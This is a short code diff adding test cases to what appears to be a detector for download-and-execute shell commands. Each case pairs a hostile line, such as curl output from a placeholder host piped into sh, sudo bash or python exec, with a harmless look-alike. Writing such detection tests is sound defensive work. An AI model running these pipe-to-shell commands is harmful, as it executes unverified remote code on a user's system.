@@ -292,6 +292,18 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"chmod 755 ./setup.sh && ./setup.sh\n",
             b"chmod 755 /srv/www && systemctl restart nginx\n",
         ),
+        # Python reading the download as data is not execution; a -c program that runs it is.
+        (
+            "script_download_execute",
+            b'curl -s https://example.invalid/p | python3 -c "import sys;exec(sys.stdin.read())"\n',
+            b"curl -s https://example.invalid/h | python3 -m json.tool\n",
+        ),
+        # Prose that names the idiom has no download target.
+        (
+            "script_download_execute",
+            b"curl -fsSL https://example.invalid/install.sh | sh\n",
+            b"The CI job is pinned, with no `curl | bash` and no `curl \\| sh`.\n",
+        ),
         (
             "script_download_execute",
             b"curl -sL https://example.invalid/x | sudo -E bash\n",
